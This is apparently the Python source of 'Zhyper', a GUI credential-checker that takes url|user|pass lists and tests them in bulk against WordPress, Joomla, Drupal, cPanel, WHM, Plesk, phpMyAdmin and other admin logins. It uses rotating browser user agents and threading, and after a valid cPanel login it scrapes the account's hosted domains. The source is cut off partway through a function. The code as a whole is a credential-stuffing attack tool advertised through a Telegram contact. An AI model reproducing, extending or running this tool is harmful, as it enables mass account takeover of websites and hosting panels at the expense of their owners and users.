"""
Zhyper All-in-One Checker V4.8.7 - CMS MASTER CHECKER
"""

import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import os
import requests
from urllib.parse import urlparse
import threading
import time
import random
import traceback
import json
import re

requests.packages.urllib3.disable_warnings()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
]

CMS_CONFIG = {
    'wordpress': {'login_url': '{url}/wp-login.php', 'login_data': {'log': '{user}', 'pwd': '{password}', 'wp-submit': 'Log In', 'testcookie': '1'}},
    'joomla': {'login_url': '{url}/administrator/index.php', 'login_data': {'username': '{user}', 'password': '{password}', 'option': 'com_login', 'task': 'login'}},
    'drupal': {'login_url': '{url}/user/login', 'login_data': {'name': '{user}', 'pass': '{password}', 'form_id': 'user_login', 'op': 'Log in'}},
    'opencart': {'login_url': '{url}/admin/index.php', 'login_data': {'username': '{user}', 'password': '{password}'}},
    'moodle': {'login_url': '{url}/login/index.php', 'login_data': {'username': '{user}', 'password': '{password}'}},
    'ojs': {'login_url': '{url}', 'login_data': {'username': '{user}', 'password': '{password}', 'remember': '1', 'source': ''}},
    'cpanel': {'login_url': '{url}/login/', 'login_data': {'user': '{user}', 'pass': '{password}'}},
    'whm': {'login_url': '{url}/login/', 'login_data': {'user': '{user}', 'pass': '{password}'}},
    'plesk': {'login_url': '{url}:8443/login_up.php', 'login_data': {'login_name': '{user}', 'passwd': '{password}'}},
    'directadmin': {'login_url': '{url}:2222/CMD_LOGIN', 'login_data': {'username': '{user}', 'password': '{password}'}},
    'phpmyadmin': {'login_url': '{url}/phpmyadmin/index.php', 'login_data': {'pma_username': '{user}', 'pma_password': '{password}', 'server': '1'}},
    'adminer': {'login_url': '{url}/adminer.php', 'login_data': {'auth[driver]': 'server', 'auth[server]': '', 'auth[username]': '{user}', 'auth[password]': '{password}'}},
}

class CPanelDomainExtractor:
    
    def __init__(self, debug_mode=False, log_callback=None):
        self.debug_mode = debug_mode
        self.log = log_callback
        
    def _debug_log(self, msg, tag="gray"):
        if self.debug_mode and self.log:
            self.log(f"  DOMAIN: {msg}", tag)
    
    def extract_domains(self, session, base_url, html_text=""):
        domains = []
        
        try:
            parsed = urlparse(base_url)
            api_base = f"{parsed.scheme}://{parsed.netloc}"
            
            if ':2083' not in api_base:
                api_base = f"{api_base}:2083"
            
            domains.extend(self._extract_from_domains_page(session, api_base))
            
            if domains:
                self._debug_log(f"Domains page: {len(domains)} domains found", "green")
            else:
                self._debug_log("Domains page failed, trying API methods...")
                
                domains.extend(self._extract_via_listaccts(session, api_base))
                
                domains.extend(self._extract_via_domaininfo(session, api_base))
                
                domains.extend(self._extract_via_park_api(session, api_base))
                
                domains.extend(self._extract_via_addon_api(session, api_base))
                
                if not domains:
                    domains.extend(self._extract_via_html_scraping(session, api_base, html_text))
            
            domains = self._cleanup_domains(domains)
            
            domains.sort(key=len)
            
            result = domains[:10]
            
            if result:
                self._debug_log(f"Total {len(result)} domains found", "green")
            else:
                self._debug_log("No domains found", "yellow")
                
            return result
            
        except Exception as e:
            self._debug_log(f"Extraction error: {str(e)[:60]}", "red")
            return []
    
    def _extract_from_domains_page(self, session, api_base):
        domains = []
        try:
            self._debug_log("Trying domains page (PRIORITY METHOD)...")
            
            domain_page_urls = [
                f"{api_base}/frontend/jupiter/domains/index.html",
                f"{api_base}/frontend/paper_lantern/domains/index.html",
                f"{api_base}/frontend/jupiter/domains/",
                f"{api_base}/frontend/paper_lantern/domains/",
            ]
            
            for domain_url in domain_page_urls:
                try:
                    self._debug_log(f"Trying: {domain_url}")
                    
                    resp = session.get(domain_url, timeout=10)
                    
                    if resp.status_code == 200:
                        html = resp.text
                        
                        json_patterns = [
                            r'"domain"\s*:\s*"([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})"',
                            r'"name"\s*:\s*"([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})"',
                            r'"_domain"\s*:\s*"([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})"',
                            r'data-domain="([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})"',
                        ]
                        
                        for pattern in json_patterns:
                            matches = re.findall(pattern, html, re.IGNORECASE)
                            domains.extend(matches)
                        
                        ui_patterns = [
                            r'<td[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})</td>',
                            r'<li[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})</li>',
                            r'<span[^>]*class="[^"]*domain[^"]*"[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})</span>',
                        ]
                        
                        for pattern in ui_patterns:
                            matches = re.findall(pattern, html, re.IGNORECASE)
                            domains.extend(matches)
                        
                        api_data_pattern = r'(?:PAGE_DATA|domains|DOMAIN_DATA)\s*[:=]\s*(\{[^}]+\}|\[[^\]]+\])'
                        api_matches = re.findall(api_data_pattern, html, re.IGNORECASE)
                        
                        for api_match in api_matches:
                            try:
                                import json
                                data = json.loads(api_match)
                                
                                if isinstance(data, dict):
                                    for key, value in data.items():
                                        if isinstance(value, str) and '.' in value:
                                            if re.match(r'^[a-z0-9][-a-z0-9.]{0,61}[a-z0-9]\.[a-z]{2,}$', value.lower()):
                                                domains.append(value)
                                elif isinstance(data, list):
                                    for item in data:
                                        if isinstance(item, str) and '.' in item:
                                            if re.match(r'^[a-z0-9][-a-z0-9.]{0,61}[a-z0-9]\.[a-z]{2,}$', item.lower()):
                                                domains.append(item)
                            except:
                                pass
                        
                        if domains:
                            self._debug_log(f"Domains page found {len(domains)} domains")
                            break
                    
                except Exception as e:
                    self._debug_log(f"Domain page error: {str(e)[:40]}")
                    continue
            
            if not domains:
                try:
                    self._debug_log("Trying domains Ajax API...")
                    
                    ajax_url = f"{api_base}/execute/DomainInfo/list_domains"
                    resp = session.get(ajax_url, timeout=8)
                    
                    if resp.status_code == 200:
                        data = resp.json()
                        
                        if 'data' in data:
                            for domain_obj in data['data']:
                                if isinstance(domain_obj, dict):
                                    if 'domain' in domain_obj:
                                        domains.append(domain_obj['domain'])
                                elif isinstance(domain_obj, str):
                                    domains.append(domain_obj)
                        
                        if domains:
                            self._debug_log(f"Ajax API: {len(domains)} domains")
                            
                except Exception as e:
                    self._debug_log(f"Ajax API error: {str(e)[:40]}")
            
        except Exception as e:
            self._debug_log(f"Domains page error: {str(e)[:40]}")
        
        return domains
    
    def _extract_via_listaccts(self, session, api_base):
        domains = []
        try:
            self._debug_log("Trying listaccts API...")
            
            api_url = f"{api_base}/json-api/listaccts"
            resp = session.get(api_url, timeout=8)
            
            if resp.status_code == 200:
                data = resp.json()
                if 'acct' in data:
                    for acct in data['acct']:
                        if 'domain' in acct and acct['domain']:
                            domains.append(acct['domain'])
                    
                    if domains:
                        self._debug_log(f"listaccts: {len(domains)} domains")
                        
        except Exception as e:
            self._debug_log(f"listaccts error: {str(e)[:40]}")
        
        return domains
    
    def _extract_via_domaininfo(self, session, api_base):
        domains = []
        try:
            self._debug_log("Trying DomainInfo API...")
            
            api_url = f"{api_base}/execute/DomainInfo/list_domains"
            resp = session.get(api_url, timeout=8)
            
            if resp.status_code == 200:
                data = resp.json()
                if 'data' in data:
                    for domain_info in data['data']:
                        if 'domain' in domain_info and domain_info['domain']:
                            domains.append(domain_info['domain'])
                    
                    if domains:
                        self._debug_log(f"DomainInfo: {len(domains)} domains")
                        
        except Exception as e:
            self._debug_log(f"DomainInfo error: {str(e)[:40]}")
        
        return domains
    
    def _extract_via_park_api(self, session, api_base):
        domains = []
        try:
            self._debug_log("Trying Park API...")
            
            api_url = f"{api_base}/json-api/cpanel"
            params = {
                'cpanel_jsonapi_apiversion': '2',
                'cpanel_jsonapi_module': 'Park',
                'cpanel_jsonapi_func': 'listparkeddomains'
            }
            
            resp = session.get(api_url, params=params, timeout=8)
            
            if resp.status_code == 200:
                data = resp.json()
                if 'cpanelresult' in data and 'data' in data['cpanelresult']:
                    for item in data['cpanelresult']['data']:
                        if isinstance(item, dict) and 'domain' in item and item['domain']:
                            domains.append(item['domain'])
                    
                    if domains:
                        self._debug_log(f"Park: {len(domains)} domains")
                        
        except Exception as e:
            self._debug_log(f"Park error: {str(e)[:40]}")
        
        return domains
    
    def _extract_via_addon_api(self, session, api_base):
        domains = []
        try:
            self._debug_log("Trying AddonDomain API...")
            
            api_url = f"{api_base}/json-api/cpanel"
            params = {
                'cpanel_jsonapi_apiversion': '2',
                'cpanel_jsonapi_module': 'AddonDomain',
                'cpanel_jsonapi_func': 'listaddondomains' 
            }
            
            resp = session.get(api_url, params=params, timeout=8)
            
            if resp.status_code == 200:
                data = resp.json()
                if 'cpanelresult' in data and 'data' in data['cpanelresult']:
                    for item in data['cpanelresult']['data']:
                        if isinstance(item, dict) and 'domain' in item and item['domain']:
                            domains.append(item['domain'])
                    
                    if domains:
                        self._debug_log(f"AddonDomain: {len(domains)} domains")
                        
        except Exception as e:
            self._debug_log(f"AddonDomain error: {str(e)[:40]}")
        
        return domains
    
    def _extract_via_html_scraping(self, session, api_base, html_text=""):
        domains = []
        try:
            self._debug_log("Trying HTML scraping...")
            
            if not html_text or len(html_text) < 500:
                try:
                    main_resp = session.get(f"{api_base}/", timeout=8)
                    if main_resp.status_code == 200:
                        html_text = main_resp.text
                except:
                    pass
            
            if not html_text:
                return domains
            
            patterns = [
                r'<strong[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})</strong>',
                
                r'Primary Domain[^<]*<[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})',
                r'Main Domain[^<]*:?[^<]*<[^>]*>([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})',
                
                r'/([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})/public_html',
                r'/home/([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})/',
                
                r'domain["\']?\s*:\s*["\']([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})["\']',
                r'primary[_-]?domain["\']?\s*:\s*["\']([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})["\']',
                
                r'href=["\']https?://([a-zA-Z0-9][-a-zA-Z0-9]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,})',
            ]
            
            for pattern in patterns:
                matches = re.findall(pattern, html_text, re.IGNORECASE)
                domains.extend(matches)
            
            if domains:
                self._debug_log(f"HTML scraping: {len(domains)} matches")
                
        except Exception as e:
            self._debug_log(f"HTML scraping error: {str(e)[:40]}")
        
        return domains
    
    def _cleanup_domains(self, domains):
        cleaned = []
        
        blacklist = {
            'example.com', 'domain.com', 'yoursite.com', 'yourdomain.com',
            'localhost.com', 'cpanel.net', 'cpanel.com', 'whm.com',
            'cloudflare.com', 'google.com', 'facebook.com', 'twitter.com',
            'jquery.com', 'bootstrap.com', 'w3.org', 'schema.org',
            'googleapis.com', 'gstatic.com', 'mozilla.org', 'apache.org',
        }
        
        for domain in domains:
            if not domain:
                continue
            
            domain = domain.strip().lower()
            
            if domain.startswith('www.'):
                domain = domain[4:]
            
            if '.' not in domain or len(domain) < 4:
                continue
            
            if domain in blacklist:
                continue
            
            if not re.match(r'^[a-z0-9][-a-z0-9.]{0,61}[a-z0-9]\.[a-z]{2,}$', domain):
                continue
            
            cleaned.append(domain)
        
        seen = set()
        result = []
        for d in cleaned:
            if d not in seen:
                seen.add(d)
                result.append(d)
        
        return result

class ZhyperChecker:
    def __init__(self, root):
        self.root = root
        self.root.title("Zhyper All-in-One Checker V4.8.7 - CMS MASTER CHECKER")
        self.root.geometry("950x750")
        self.root.configure(bg='#0a0a0a')

        self.file_path = tk.StringVar()
        self.selected_cms = tk.StringVar()
        self.thread_count = tk.StringVar(value="10")
        self.debug_mode = tk.BooleanVar(value=False)
        self.ojs_deep_check = tk.BooleanVar(value=False)
        self.running = False
        self.threads = []
        self.max_threads = 10
        self.stats_labels = {}
        self.domain_extractor = None
        
        self.ojs_cache = {}
        self.ojs_cache_lock = threading.Lock()

        self.create_widgets()
        
        self.root.after(100, self.show_banner)

    def create_widgets(self):
        main = tk.Frame(self.root, bg='#0a0a0a')
        main.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)

        hdr = tk.Frame(main, bg='#0a0a0a')
        hdr.pack(fill=tk.X, pady=10)
        tk.Label(hdr, text="ZHYPER", font=('Consolas', 26, 'bold'), bg='#0a0a0a', fg='#00ff41').pack(side=tk.LEFT, padx=10)
        tk.Label(hdr, text="ALL-IN-ONE", font=('Consolas', 26, 'bold'), bg='#0a0a0a', fg='#ffffff').pack(side=tk.LEFT)
        tk.Label(hdr, text="V4.8.7 CMS MASTER CHECKER", font=('Consolas', 13), bg='#0a0a0a', fg='#ff00ff').pack(side=tk.LEFT, padx=10)

        stats = tk.Frame(main, bg='#0a0a0a')
        stats.pack(fill=tk.X, pady=15)
        self.stats_labels = {}
        for label, val, col in [("Total", "0", "#666"), ("Done", "0", "#666"), ("✓ Valid", "0", "#0f0"), ("✗ Fail", "0", "#f44"), ("⚠ Err", "0", "#fa0")]:
            box = tk.Frame(stats, bg='#1a1a1a', bd=0)
            box.pack(side=tk.LEFT, padx=8, fill=tk.X, expand=True, ipady=8)
            tk.Label(box, text=label, font=('Consolas', 9), bg='#1a1a1a', fg='#888').pack()
            lbl = tk.Label(box, text=val, font=('Consolas', 18, 'bold'), bg='#1a1a1a', fg=col)
            lbl.pack()
            self.stats_labels[label] = lbl

        term = tk.Frame(main, bg='#0a0a0a')
        term.pack(fill=tk.BOTH, expand=True, pady=10)
        tk.Label(term, text="▶ TERMINAL", font=('Consolas', 10, 'bold'), bg='#0a0a0a', fg='#0f0', anchor='w').pack(fill=tk.X, padx=5)
        self.output = scrolledtext.ScrolledText(term, bg='#0a0a0a', fg='#0f0', font=('Consolas', 9), height=20, relief=tk.FLAT, bd=0, insertbackground='#0f0')
        self.output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        for tag, col in [("green", "#0f0"), ("red", "#f44"), ("yellow", "#fa0"), 
                    ("cyan", "#0af"), ("gray", "#666"), ("white", "#fff"), 
                    ("magenta", "#f0f")]:
            self.output.tag_config(tag, foreground=col)

        ctrl = tk.Frame(main, bg='#0a0a0a')
        ctrl.pack(fill=tk.X, pady=10)
        tk.Label(ctrl, text="FILE:", font=('Consolas', 10), bg='#0a0a0a', fg='#0f0').grid(row=0, column=0, padx=5, sticky='w')
        tk.Entry(ctrl, textvariable=self.file_path, width=40, font=('Consolas', 10), bg='#1a1a1a', fg='#fff', insertbackground='#0f0', relief=tk.FLAT).grid(row=0, column=1, padx=5)
        tk.Button(ctrl, text="Browse", command=self.browse, bg='#0f0', fg='#000', font=('Consolas', 10, 'bold'), relief=tk.FLAT, padx=15).grid(row=0, column=2, padx=5)
        tk.Label(ctrl, text="THREADS:", font=('Consolas', 10), bg='#0a0a0a', fg='#0f0').grid(row=0, column=3, padx=5)
        tk.Entry(ctrl, textvariable=self.thread_count, width=5, font=('Consolas', 10), bg='#1a1a1a', fg='#fff', insertbackground='#0f0', relief=tk.FLAT).grid(row=0, column=4, padx=5)
        tk.Checkbutton(ctrl, text="DEBUG", variable=self.debug_mode, bg='#0a0a0a', fg='#0af', selectcolor='#1a1a1a', font=('Consolas', 10)).grid(row=0, column=5, padx=5)
        tk.Checkbutton(ctrl, text="DEEP", variable=self.ojs_deep_check, bg='#0a0a0a', fg='#fa0', selectcolor='#1a1a1a', font=('Consolas', 9)).grid(row=0, column=6, padx=5)
        
        btns = tk.Frame(ctrl, bg='#0a0a0a')
        btns.grid(row=0, column=7, padx=10)
        self.start_btn = tk.Button(btns, text="▶ START", command=self.start, bg='#0f0', fg='#000', font=('Consolas', 12, 'bold'), relief=tk.FLAT, padx=20, pady=5)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        self.stop_btn = tk.Button(btns, text="■ STOP", command=self.stop, bg='#f44', fg='#000', font=('Consolas', 12, 'bold'), relief=tk.FLAT, padx=20, pady=5, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT)

    def log(self, msg, tag="white"):
        self.output.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n", tag)
        self.output.see(tk.END)

    def update_stat(self, label, val):
        if label in self.stats_labels:
            self.stats_labels[label].config(text=str(val))

    def incr_stat(self, label):
        cur = int(self.stats_labels[label].cget("text"))
        self.update_stat(label, cur + 1)

    def browse(self):
        path = filedialog.askopenfilename(filetypes=[("Text", "*.txt")])
        if path:
            self.file_path.set(path)
            cms = self.detect_cms(os.path.basename(path).lower())
            if cms:
                self.selected_cms.set(cms)
                self.log(f"✓ CMS: {cms.upper()}", "green")
            else:
                self.log("⚠ CMS not detected", "yellow")

    def show_banner(self):
        self.log("═" * 55, "green")
        self.log("  ███████╗██╗  ██╗██╗   ██╗██████╗ ███████╗██████╗ ", "cyan")
        self.log("  ╚══███╔╝██║  ██║╚██╗ ██╔╝██╔══██╗██╔════╝██╔══██╗", "cyan")
        self.log("    ███╔╝ ███████║ ╚████╔╝ ██████╔╝█████╗  ██████╔╝", "cyan")
        self.log("   ███╔╝  ██╔══██║  ╚██╔╝  ██╔═══╝ ██╔══╝  ██╔══██╗", "cyan")
        self.log("  ███████╗██║  ██║   ██║   ██║     ███████╗██║  ██║", "cyan")
        self.log("  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝", "cyan")
        self.log("", "white")
        self.log("  💬 Contact: https://t.me/zhyperflow", "magenta")
        self.log("  ⚡ Powered by Zhyper", "green")
        self.log("", "white")
        self.log("  Support For CMS :", "white")
        self.log("  1.WordPress   4.OpenCart   7.Cpanel    10.DirectAdmin", "white")
        self.log("  2.Joomla      5.Moodle     8.WHM       11.PhpMyAdmin", "white")
        self.log("  3.Drupal      6.OJS        9.Plesk     12.Adminer", "white")
        self.log("", "white")
        self.log("  Format : url|user|pass", "white")
        self.log("  You can browse file to input for scanning,", "white")
        self.log("  file name all lowercase example wordpress.txt.", "white")
        self.log("═" * 55, "green")
        self.log("", "white")

    def detect_cms(self, fn):
        for cms in CMS_CONFIG.keys():
            if cms in fn:
                return cms
        return None
    
    def verify_ojs(self, url):
        try:
            if not url.startswith('http'):
                url = f"https://{url}"
            
            s = requests.Session()
            s.verify = False
            s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
            
            resp = s.get(url, timeout=10, allow_redirects=True)
            
            if resp.status_code == 404:
                return (False, "404 Not Found")
            
            if resp.status_code >= 500:
                return (False, f"{resp.status_code} Server Error")
            
            txt = resp.text
            txt_lower = txt.lower()
            
            strong_indicators = [
                'open journal systems',
                'generator" content="open journal systems',
                'publicknowledgeproject',
            ]
            
            has_strong = any(ind in txt_lower for ind in strong_indicators)
            
            medium_indicators = [
                'pkp',
                'ojs/',
                '/lib/pkp/',
                'journal_path',
            ]
            
            medium_count = sum(1 for ind in medium_indicators if ind in txt_lower)
            
            weak_indicators = [
                '/index.php/',
            ]
            
            weak_count = sum(1 for ind in weak_indicators if ind in txt_lower)
            
            has_ojs_cookie = any('ojssid' in k.lower() for k in s.cookies.keys())
            
            score = 0
            if has_strong:
                score += 3
            if has_ojs_cookie:
                score += 3
            score += medium_count * 2
            score += weak_count * 1
            
            if self.debug_mode.get():
                self.log(f"  OJS Detection: Score={score} (strong={has_strong}, cookie={has_ojs_cookie}, medium={medium_count})", "cyan")
            
            if score >= 3 and (has_strong or has_ojs_cookie):
                return (True, "OJS confirmed")
            else:
                reasons = []
                if not has_strong:
                    reasons.append("no OJS text")
                if not has_ojs_cookie:
                    reasons.append("no OJSSID cookie")
                return (False, f"Not OJS: {', '.join(reasons)}")
        
        except requests.Timeout:
            return (False, "Timeout - cannot verify")
        except requests.ConnectionError:
            return (False, "Connection error")
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  OJS Detection error: {str(e)[:50]}", "yellow")
            return (False, f"Verification failed: {str(e)[:30]}")
    
    def detect_ojs_from_url(self, url, deep_check=False):
        try:
            from urllib.parse import urlparse
            parsed = urlparse(url)
            domain = parsed.netloc
            
            with self.ojs_cache_lock:
                if domain in self.ojs_cache:
                    cached_result = self.ojs_cache[domain]
                    if self.debug_mode.get():
                        self.log(f"  OJS Detection (cached): {domain} → {'OJS' if cached_result else 'Not OJS'}", "gray")
                    return cached_result
            
            url_lower = url.lower()
            
            if '/index.php/' not in url_lower:
                with self.ojs_cache_lock:
                    self.ojs_cache[domain] = False
                return False
            
            ojs_patterns = [
                '/index.php/index/',
                '/index.php/ojs/',
                '/login',
            ]
            
            has_ojs_pattern = any(pattern in url_lower for pattern in ojs_patterns)
            
            ojs_keywords = ['journal', 'jurnal', 'ojs', 'ejournal', 'e-journal', 'proceeding']
            has_ojs_keyword = any(keyword in domain.lower() for keyword in ojs_keywords)
            
            if has_ojs_pattern or has_ojs_keyword:
                is_ojs = True
            else:
                is_ojs = '/login' in url_lower
            
            if self.debug_mode.get():
                self.log(f"  OJS Detection (pattern): {domain} → {'OJS' if is_ojs else 'Not OJS'}", "cyan")
            
            if deep_check and is_ojs:
                try:
                    s = requests.Session()
                    s.verify = False
                    s.headers.update({'User-Agent': random.choice(USER_AGENTS)})
                    
                    test_url = url.rsplit('/login', 1)[0] if '/login' in url else url
                    resp = s.get(test_url, timeout=3, allow_redirects=True)
                    txt = resp.text.lower()
                    
                    ojs_markers = ['open journal systems', 'pkp/ojs', 'ojssid']
                    marker_count = sum(1 for marker in ojs_markers if marker in txt)
                    
                    if marker_count == 0:
                        is_ojs = False
                        if self.debug_mode.get():
                            self.log(f"  OJS Deep check: {domain} → Not OJS (no markers)", "yellow")
                    else:
                        if self.debug_mode.get():
                            self.log(f"  OJS Deep check: {domain} → OJS ({marker_count} markers)", "green")
                except:
                    pass
            
            with self.ojs_cache_lock:
                self.ojs_cache[domain] = is_ojs
            
            return is_ojs
            
        except Exception as e:
            if self.debug_mode.get():
                self.log(f"  OJS Detection error: {str(e)[:50]} → Assuming OJS", "yellow")
            return True

    def validate_ojs_login_strict(self, session, url, resp):
        try:
            final_url = resp.url.lower()
            txt = resp.text
            txt_lower = txt.lower()
            status_code = resp.status_code
            
            if self.debug_mode.get():
                self.log(f"  OJS LOGIN: POST status={status_code}", "cyan")
                self.log(f"  OJS LOGIN: Final URL={final_url[:80]}", "cyan")
                self.log(f"  OJS LOGIN: Redirects={len(resp.history)}", "cyan")
            
            if '/login/signin' in final_url or final_url.endswith('/login') or final_url.endswith('/login/'):
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✗ INVALID - Still at login page!", "red")
                return (False, "Still at login page - invalid credentials")
            
            error_patterns = [
                'invalid username or password',
                'invalid credentials',
                'authentication failed',
                'login failed',
                'incorrect username or password',
                'error: invalid',
                'username atau password',
            ]
            
            has_error = any(err in txt_lower for err in error_patterns)
            if has_error:
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✗ INVALID - Error message in response!", "red")
                return (False, "Login error message detected")
            
            login_form_indicators = [
                'name="username"',
                'name="password"',
                'type="password"',
                'id="username"',
                'id="password"',
            ]
            
            form_count = sum(1 for indicator in login_form_indicators if indicator in txt_lower)
            
            if form_count >= 3:
                if '/login' in final_url or '/user' in final_url:
                    if self.debug_mode.get():
                        self.log(f"  OJS LOGIN: ✗ INVALID - Login form still present!", "red")
                    return (False, "Login form still visible - invalid credentials")
            
            if resp.history:
                redirect_urls = [r.url.lower() for r in resp.history]
                
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: Redirect chain: {len(redirect_urls)} hops", "cyan")
                
                has_left_login = any('/login' not in r for r in redirect_urls[-2:]) if len(redirect_urls) >= 2 else True
                
                if not has_left_login and '/login/signin' in final_url:
                    if self.debug_mode.get():
                        self.log(f"  OJS LOGIN: ✗ INVALID - Never left login!", "red")
                    return (False, "No redirect away from login")
            
            if '/user/setlocale' in final_url:
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: OJS v2 setLocale redirect - checking further...", "cyan")
                
                try:
                    base = final_url.split('/user/setlocale')[0]
                    profile_url = f"{base}/user/profile"
                    
                    profile_resp = session.get(profile_url, timeout=8, allow_redirects=True)
                    
                    if '/login' in profile_resp.url.lower():
                        if self.debug_mode.get():
                            self.log(f"  OJS LOGIN: ✗ INVALID - Profile redirect to login!", "red")
                        return (False, "v2 profile test failed")
                    else:
                        if self.debug_mode.get():
                            self.log(f"  OJS LOGIN: ✓ VALID - v2 profile accessible!", "green")
                        return (True, session)
                except:
                    if self.debug_mode.get():
                        self.log(f"  OJS LOGIN: ⚠ v2 profile test error - assuming INVALID", "yellow")
                    return (False, "v2 verification failed")
            
            valid_patterns = [
                '/index',
                '/dashboard',
                '/submissions',
                '/about',
                '/issue',
                '/user/profile',
                '/authordashboard',
                '/reviewerdashboard',
            ]
            
            is_valid_destination = any(pattern in final_url for pattern in valid_patterns)
            
            has_logout = 'logout' in txt_lower and ('href' in txt_lower or 'logout?source=' in txt_lower)
            
            has_user_menu = any(indicator in txt_lower for indicator in [
                'user navigation menu',
                'view profile',
                'my submissions',
                'user menu',
                'logged in as',
            ])
            
            if self.debug_mode.get():
                self.log(f"  OJS LOGIN: valid_dest={is_valid_destination}, logout={has_logout}, menu={has_user_menu}", "cyan")
            
            if is_valid_destination and (has_logout or has_user_menu):
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✓ VALID - Good redirect + indicators!", "green")
                return (True, session)
            
            elif is_valid_destination and resp.history:
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✓ VALID - Redirected to valid destination!", "green")
                return (True, session)
            
            elif has_logout and not ('/login' in final_url):
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✓ VALID - Logout link present!", "green")
                return (True, session)
            
            else:
                if self.debug_mode.get():
                    self.log(f"  OJS LOGIN: ✗ INVALID - No strong valid indicators!", "red")
                return (False, "Cannot confirm valid login")
            
        except Exception as e:
            if self.debug_mode.get():
